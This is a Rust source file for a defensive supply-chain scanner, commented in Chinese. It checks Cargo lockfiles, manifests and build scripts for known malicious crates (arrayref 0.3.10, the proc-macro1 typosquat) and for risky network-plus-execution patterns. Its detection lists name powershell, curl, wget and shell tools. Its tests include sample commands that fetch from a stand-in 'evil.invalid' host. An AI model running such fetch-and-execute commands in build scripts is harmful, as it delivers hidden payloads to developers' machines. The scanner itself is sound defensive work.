use std::{
    collections::HashSet,
    fs,
    path::{Path, PathBuf},
};

use anyhow::{Context, Result};
use ring::digest::{SHA256, digest};

use super::{StaticIndicator, StaticScanReport};

const MAX_STATIC_FILE_BYTES: u64 = 16 * 1024 * 1024;
const MAX_STATIC_FILES: usize = 10_000;

/// 在任何构建或测试之前，只读检查 Cargo 锁文件、清单和构建脚本。
pub fn scan_supply_chain_tree(project: &str, root: impl AsRef<Path>) -> Result<StaticScanReport> {
    let root = root.as_ref();
    anyhow::ensure!(root.is_dir(), "扫描目录不存在：{}", root.display());

    let mut files = Vec::new();
    collect_static_files(root, &mut files)?;
    files.sort();

    let mut blockers = Vec::new();
    let mut warnings = Vec::new();
    for path in &files {
        let raw = fs::read_to_string(path)
            .with_context(|| format!("读取静态审计文件失败：{}", path.display()))?;
        let relative = path
            .strip_prefix(root)
            .unwrap_or(path)
            .to_string_lossy()
            .replace('\\', "/");
        match path.file_name().and_then(|name| name.to_str()) {
            Some("Cargo.lock") => inspect_cargo_lock(&relative, &raw, &mut blockers)?,
            Some("Cargo.toml") => inspect_cargo_manifest(&relative, &raw, &mut blockers)?,
            Some("build.rs") => inspect_build_script(&relative, &raw, &mut blockers, &mut warnings),
            _ => {}
        }
    }
    Ok(finalize_static_report(
        project,
        root.display().to_string(),
        files.len(),
        blockers,
        warnings,
    ))
}

fn collect_static_files(current: &Path, files: &mut Vec<PathBuf>) -> Result<()> {
    for entry in
        fs::read_dir(current).with_context(|| format!("读取扫描目录失败：{}", current.display()))?
    {
        let entry = entry?;
        let path = entry.path();
        let metadata = fs::symlink_metadata(&path)?;
        if metadata.file_type().is_symlink() {
            continue;
        }
        if metadata.is_dir() {
            let name = entry.file_name();
            let name = name.to_string_lossy();
            if directory_is_ignored(current, &name) {
                continue;
            }
            collect_static_files(&path, files)?;
            continue;
        }
        let name = entry.file_name();
        let name = name.to_string_lossy();
        if matches!(name.as_ref(), "Cargo.lock" | "Cargo.toml" | "build.rs") {
            anyhow::ensure!(
                metadata.len() <= MAX_STATIC_FILE_BYTES,
                "静态审计文件超过 {} 字节，已拒绝继续：{}",
                MAX_STATIC_FILE_BYTES,
                path.display()
            );
            files.push(path);
            anyhow::ensure!(
                files.len() <= MAX_STATIC_FILES,
                "静态审计文件超过 {} 个，已拒绝继续",
                MAX_STATIC_FILES
            );
        }
    }
    Ok(())
}

fn directory_is_ignored(parent: &Path, name: &str) -> bool {
    if matches!(name, ".git" | "target" | "node_modules") {
        return true;
    }
    // 常规测试夹具不会进入生产依赖图；直接扫描夹具目录本身时仍会完整检查。
    name == "fixtures"
        && parent
            .file_name()
            .and_then(|value| value.to_str())
            .is_some_and(|value| value == "tests")
}

fn inspect_cargo_lock(path: &str, raw: &str, blockers: &mut Vec<StaticIndicator>) -> Result<()> {
    let document: toml::Value = raw
        .parse()
        .with_context(|| format!("解析 Cargo.lock 失败：{path}"))?;
    let Some(packages) = document.get("package").and_then(toml::Value::as_array) else {
        return Ok(());
    };
    for package in packages {
        let name = package
            .get("name")
            .and_then(toml::Value::as_str)
            .unwrap_or("");
        let version = package
            .get("version")
            .and_then(toml::Value::as_str)
            .unwrap_or("");
        let checksum = package
            .get("checksum")
            .and_then(toml::Value::as_str)
            .unwrap_or("");
        inspect_known_malicious_package(path, name, version, checksum, blockers);
    }
    Ok(())
}

pub(super) fn inspect_cargo_manifest(
    path: &str,
    raw: &str,
    blockers: &mut Vec<StaticIndicator>,
) -> Result<()> {
    let document: toml::Value = raw
        .parse()
        .with_context(|| format!("解析 Cargo.toml 失败：{path}"))?;
    if let Some(package) = document.get("package") {
        let name = package
            .get("name")
            .and_then(toml::Value::as_str)
            .unwrap_or("");
        let version = package
            .get("version")
            .and_then(toml::Value::as_str)
            .unwrap_or("");
        inspect_known_malicious_package(path, name, version, "", blockers);
    }
    for section in ["dependencies", "build-dependencies", "dev-dependencies"] {
        if document
            .get(section)
            .and_then(toml::Value::as_table)
            .is_some_and(|dependencies| dependencies.contains_key("proc-macro1"))
        {
            blockers.push(indicator(
                "SC-RUST-TYPOSQUAT-PROC-MACRO1",
                "blocker",
                path,
                "清单引用已确认的拼写劫持 crate proc-macro1",
                format!("{section}.proc-macro1"),
            ));
        }
    }
    Ok(())
}

fn inspect_known_malicious_package(
    path: &str,
    name: &str,
    version: &str,
    checksum: &str,
    blockers: &mut Vec<StaticIndicator>,
) {
    if name == "arrayref" && version == "0.3.10" {
        blockers.push(indicator(
            "SC-RUST-ARRAYREF-0.3.10",
            "blocker",
            path,
            "锁定了已确认携带恶意传递依赖的 arrayref 0.3.10",
            package_evidence(name, version, checksum),
        ));
    }
    if name == "proc-macro1" {
        blockers.push(indicator(
            "SC-RUST-TYPOSQUAT-PROC-MACRO1",
            "blocker",
            path,
            "锁定了冒充 proc-macro2 的恶意 crate proc-macro1",
            package_evidence(name, version, checksum),
        ));
    }
}

pub(super) fn inspect_build_script(
    path: &str,
    raw: &str,
    blockers: &mut Vec<StaticIndicator>,
    warnings: &mut Vec<StaticIndicator>,
) {
    let lower = strip_rust_comments(raw).to_ascii_lowercase();
    let network_api_markers = [
        "reqwest::blocking",
        "reqwest::client",
        "ureq::get",
        "ureq::post",
        "tcpstream::connect",
        "udpsocket::connect",
    ];
    let execution_markers = [
        "command::new",
        ".spawn(",
        "powershell",
        "wscript",
        "chmod",
        "create_no_window",
    ];
    let dangerous_command_markers = [
        "powershell",
        "pwsh",
        "cmd.exe",
        "command::new(\"cmd\")",
        "wscript",
        "cscript",
        "invoke-webrequest",
        "start-bitstransfer",
        "curl.exe",
        "command::new(\"curl\")",
        "command::new(\"wget\")",
        "command::new(\"python\")",
        "command::new(\"python3\")",
        "command::new(\"sh\")",
        "command::new(\"bash\")",
    ];
    let network = matching_markers(&lower, &network_api_markers);
    let execution = matching_markers(&lower, &execution_markers);
    let urls = matching_markers(&lower, &["https://", "http://"]);
    let dangerous_commands = matching_markers(&lower, &dangerous_command_markers);
    let git_download = lower.contains("command::new(\"git\")")
        && (lower.contains("arg(\"clone\")") || lower.contains("arg(\"fetch\")"));
    let downloads_and_executes = !network.is_empty() && !execution.is_empty()
        || !urls.is_empty() && (!dangerous_commands.is_empty() || git_download);

    if downloads_and_executes {
        blockers.push(indicator(
            "SC-BUILD-NETWORK-EXECUTION",
            "blocker",
            path,
            "构建脚本同时具备网络访问和进程执行能力",
            format!(
                "network=[{}], urls=[{}], execution=[{}], dangerous_commands=[{}], git_download={}",
                network.join(","),
                urls.join(","),
                execution.join(","),
                dangerous_commands.join(","),
                git_download
            ),
        ));
    } else if !network.is_empty() {
        warnings.push(indicator(
            "SC-BUILD-NETWORK",
            "high",
            path,
            "构建脚本包含网络访问能力，需要在断网沙箱中复核",
            network.join(","),
        ));
    } else if !execution.is_empty() {
        warnings.push(indicator(
            "SC-BUILD-PROCESS",
            "medium",
            path,
            "构建脚本会启动外部进程，需要确认用途",
            execution.join(","),
        ));
    }

    let evasion_markers = matching_markers(
        &lower,
        &[
            "dangerous()",
            "acceptall",
            "mem::forget",
            "base64",
            "detached",
        ],
    );
    if !evasion_markers.is_empty()
        && (!network.is_empty()
            || !urls.is_empty()
            || !execution.is_empty()
            || !dangerous_commands.is_empty())
    {
        blockers.push(indicator(
            "SC-BUILD-EVASION",
            "blocker",
            path,
            "构建脚本包含与隐藏载荷或逃逸相关的行为组合",
            evasion_markers.join(","),
        ));
    }
}

/// 去掉 Rust 行注释和块注释，但保留字符串内容，以区分文档 URL 与真实命令参数。
fn strip_rust_comments(raw: &str) -> String {
    #[derive(Clone, Copy)]
    enum State {
        Code,
        String,
        Character,
        LineComment,
        BlockComment(usize),
    }

    let chars = raw.chars().collect::<Vec<_>>();
    let mut output = String::with_capacity(raw.len());
    let mut state = State::Code;
    let mut escaped = false;
    let mut index = 0;
    while index < chars.len() {
        let current = chars[index];
        let next = chars.get(index + 1).copied();
        match state {
            State::Code if current == '/' && next == Some('/') => {
                state = State::LineComment;
                output.push(' ');
                index += 2;
            }
            State::Code if current == '/' && next == Some('*') => {
                state = State::BlockComment(1);
                output.push(' ');
                index += 2;
            }
            State::Code => {
                output.push(current);
                if current == '"' {
                    state = State::String;
                    escaped = false;
                } else if current == '\'' {
                    state = State::Character;
                    escaped = false;
                }
                index += 1;
            }
            State::String => {
                output.push(current);
                if current == '"' && !escaped {
                    state = State::Code;
                }
                escaped = current == '\\' && !escaped;
                if current != '\\' {
                    escaped = false;
                }
                index += 1;
            }
            State::Character => {
                output.push(current);
                if current == '\'' && !escaped {
                    state = State::Code;
                }
                escaped = current == '\\' && !escaped;
                if current != '\\' {
                    escaped = false;
                }
                index += 1;
            }
            State::LineComment => {
                if current == '\n' {
                    output.push('\n');
                    state = State::Code;
                }
                index += 1;
            }
            State::BlockComment(depth) if current == '/' && next == Some('*') => {
                state = State::BlockComment(depth + 1);
                index += 2;
            }
            State::BlockComment(depth) if current == '*' && next == Some('/') => {
                state = if depth == 1 {
                    State::Code
                } else {
                    State::BlockComment(depth - 1)
                };
                index += 2;
            }
            State::BlockComment(depth) => {
                if current == '\n' {
                    output.push('\n');
                }
                state = State::BlockComment(depth);
                index += 1;
            }
        }
    }
    output
}

fn matching_markers(raw: &str, markers: &[&str]) -> Vec<String> {
    markers
        .iter()
        .filter(|marker| raw.contains(**marker))
        .map(|marker| (*marker).to_string())
        .collect()
}

fn indicator(
    rule_id: &str,
    severity: &str,
    path: &str,
    summary: &str,
    evidence: String,
) -> StaticIndicator {
    StaticIndicator {
        rule_id: rule_id.to_string(),
        severity: severity.to_string(),
        path: path.to_string(),
        summary: summary.to_string(),
        evidence,
    }
}

fn package_evidence(name: &str, version: &str, checksum: &str) -> String {
    if checksum.is_empty() {
        format!("package={name}, version={version}")
    } else {
        format!("package={name}, version={version}, checksum={checksum}")
    }
}

fn deduplicate_indicators(indicators: &mut Vec<StaticIndicator>) {
    let mut seen = HashSet::new();
    indicators
        .retain(|item| seen.insert(format!("{}:{}:{}", item.rule_id, item.path, item.evidence)));
}

pub(super) fn finalize_static_report(
    project: &str,
    root: String,
    scanned_files: usize,
    mut blockers: Vec<StaticIndicator>,
    mut warnings: Vec<StaticIndicator>,
) -> StaticScanReport {
    deduplicate_indicators(&mut blockers);
    deduplicate_indicators(&mut warnings);
    let dedupe_source = blockers
        .iter()
        .chain(&warnings)
        .map(|item| format!("{}:{}:{}", item.rule_id, item.path, item.evidence))
        .collect::<Vec<_>>()
        .join("\n");
    let dedupe_key = hex_digest(dedupe_source.as_bytes());
    StaticScanReport {
        project: project.to_string(),
        root,
        scanned_files,
        build_allowed: blockers.is_empty(),
        blockers,
        warnings,
        dedupe_key,
    }
}

pub(super) fn merge_static_reports(
    project: &str,
    root: String,
    reports: impl IntoIterator<Item = StaticScanReport>,
) -> StaticScanReport {
    let mut scanned_files = 0;
    let mut blockers = Vec::new();
    let mut warnings = Vec::new();
    for report in reports {
        scanned_files += report.scanned_files;
        blockers.extend(report.blockers);
        warnings.extend(report.warnings);
    }
    finalize_static_report(project, root, scanned_files, blockers, warnings)
}

fn hex_digest(bytes: &[u8]) -> String {
    digest(&SHA256, bytes)
        .as_ref()
        .iter()
        .map(|byte| format!("{byte:02x}"))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn documentation_url_plus_compiler_probe_is_not_network_execution() {
        let script = r#"
// Documentation: https://example.invalid/build
fn main() {
    std::process::Command::new("rustc").arg("--version").status().unwrap();
}
"#;
        let mut blockers = Vec::new();
        let mut warnings = Vec::new();
        inspect_build_script("build.rs", script, &mut blockers, &mut warnings);
        assert!(blockers.is_empty());
    }

    #[test]
    fn powershell_url_and_git_clone_variants_are_blocked() {
        for script in [
            r#"Command::new("powershell").args(["-c", "Invoke-WebRequest https://evil.invalid/x"]);"#,
            r#"Command::new("git").arg("clone").arg("https://evil.invalid/repo");"#,
            r#"Command::new("curl.exe").arg("https://evil.invalid/x").spawn();"#,
        ] {
            let mut blockers = Vec::new();
            let mut warnings = Vec::new();
            inspect_build_script("build.rs", script, &mut blockers, &mut warnings);
            assert!(
                blockers
                    .iter()
                    .any(|item| item.rule_id == "SC-BUILD-NETWORK-EXECUTION"),
                "missing blocker for {script}"
            );
        }
    }

    #[test]
    fn nested_block_comments_are_removed_but_string_urls_remain() {
        let stripped = strip_rust_comments(
            "/* outer https://comment /* nested */ end */ let x = \"https://string\";",
        );
        assert!(!stripped.contains("comment"));
        assert!(stripped.contains("https://string"));
    }
}
